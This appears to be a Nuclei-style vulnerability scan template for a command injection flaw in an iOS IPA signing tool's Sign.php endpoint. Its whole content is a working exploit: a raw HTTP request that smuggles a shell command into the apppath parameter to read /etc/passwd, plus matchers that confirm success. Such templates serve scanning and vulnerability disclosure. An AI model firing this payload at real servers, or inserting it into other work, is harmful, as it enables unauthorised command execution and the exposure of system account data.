id: poc-yaml-iso-ipa-sign-apppath-rce
info:
  name: 苹果IOS端IPA签名工具Sign.php前台任意命令执行漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - raw:
      - |
        GET /api/sign/sign?udidres[0][sjskg]=1&noinject[name]=a&ttname=1&udid=1&appname=1&appid=a&appicon=1&apppath=|cat%20/etc/passwd%3e1.txt|&p12path=1&mppath=1&appbid=1&ipaPath=1&gm=0&filesPath=1&rm=1&app_name=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - '"msg"\s*:\s*"root:.*:0:0:"'
